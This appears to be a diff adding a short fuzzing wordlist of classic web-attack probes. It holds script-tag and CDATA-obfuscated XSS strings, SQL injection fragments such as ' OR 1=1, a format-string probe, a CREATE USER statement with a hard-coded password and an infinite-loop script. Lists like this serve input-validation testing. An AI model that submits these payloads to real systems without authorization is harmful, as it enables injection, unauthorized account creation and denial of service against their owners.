@@ -1,0 +1,10 @@
+>"><script>alert("XSS")</script>&
+'';!--"<XSS>=&{()}
+A x 5
+%s%p%x%d
+0x1000
+' union select 
+' OR 1=1
+CREATE USER name IDENTIFIED BY 'pass123'
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
